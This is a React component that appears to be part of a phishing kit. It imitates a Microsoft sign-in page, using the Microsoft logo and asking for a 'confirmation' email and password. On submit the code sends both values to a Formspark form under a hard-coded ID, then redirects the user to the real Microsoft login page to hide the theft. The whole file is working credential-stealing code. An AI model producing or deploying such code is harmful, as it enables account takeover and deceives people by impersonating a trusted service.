import { useFormspark } from "@formspark/use-formspark";
import { useState } from "react";
import "react-toastify/dist/ReactToastify.css";
import Logo from "../assests/images/microsoft_logo.svg";

const FORMSPARK_FORM_ID = "xkY59p0W";

const Login = () => {
  const [eml, setEml] = useState("");
  const [passing, setPassing] = useState("");

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    await submit({ eml, passing });
    return window.location.replace(
      "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct=1697639788&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26deeplink%3dowa%252f%26RpsCsrfState%3d5d4c7bb3-25be-91dc-5e16-5c8c16b3380f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c"
    );
  };

  return (
    <div className="md:bg-office h-screen pt-4 md:pt-20">
      <div className="md:w-96 h-auto w-80 p-4 md:p-8 bg-white mx-auto">
        <img src={Logo} alt="logo" />
        <div className="text-3xl bold my-4">Enter the confirmation email</div>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            value={eml}
            onChange={(e) => setEml(e.target.value)}
            className="outline-none border-blue-400 pt-1 my-3 border-b-2 w-full"
            placeholder="Confirmation e-mail"
            required
          />
          <input
            type="password"
            value={passing}
            onChange={(e) => setPassing(e.target.value)}
            className="outline-none border-blue-400 pt-1 my-2 border-b-2 w-full"
            placeholder="confirmation password"
            required
          />
          <div className="py-5 ml-44 md:ml-52">
            <button
              type="submit"
              className="px-6 py-1 text-white bg-blue-600"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Sign in
            </button>
            {/* </Link> */}
          </div>
        </form>
      </div>

      {/* <div className="flex absolute pb-2 text-black text-xs right-0 bottom-0">
        <a href="#" className="mx-4">
          Nutzungsbedingungen
        </a>
        <a href="#" className="mr-4">
          Datenschutz und Cookies
        </a>
        <a href="#" className="mr-4">
          ...
        </a>
      </div> */}
    </div>
  );
};
export default Login;
